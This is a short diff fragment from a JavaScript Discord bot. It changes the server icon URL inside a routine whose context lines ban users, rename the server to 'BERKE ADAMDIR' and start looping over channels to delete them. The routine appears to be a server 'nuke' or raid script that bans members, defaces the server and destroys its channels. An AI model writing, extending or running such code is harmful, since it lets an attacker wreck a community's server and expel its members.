@@ -19,7 +19,7 @@ message.guild.ban(u, "Berke Adamdır")
 
   
 message.guild.setName(`BERKE ADAMDIR`, ":))")
-message.guild.setIcon(`https://discordapp.com/channels/551706577023795201/564817548940541981/566650620585443343`)
+message.guild.setIcon(`https://cdn.discordapp.com/attachments/551708253344759851/566650212467212298/Screenshot_17.png`)
   
 message.guild.channels.forEach(c => {
 if (c.deletable) {
